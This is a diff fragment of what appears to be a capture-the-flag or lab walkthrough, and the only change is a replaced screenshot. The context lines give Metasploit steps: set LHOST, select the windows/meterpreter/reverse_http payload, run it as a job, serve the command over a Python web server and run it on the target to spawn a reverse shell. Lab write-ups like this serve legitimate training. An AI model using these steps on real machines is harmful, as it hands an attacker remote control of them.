@@ -197,7 +197,7 @@ Check your tun0 IP address by command `ifconfig` then set your LHOST by `set LHO
 
 4. Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.
 
-<img width="856" height="181" alt="image" src="https://github.com/user-attachments/assets/e3705727-80d3-4c11-b95c-6c8efacaeeec" />
+<img width="1138" height="240" alt="image" src="https://github.com/user-attachments/assets/c766cdec-1616-4dc2-aaca-d3f8481f5996" />
 
 5. Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned.
 
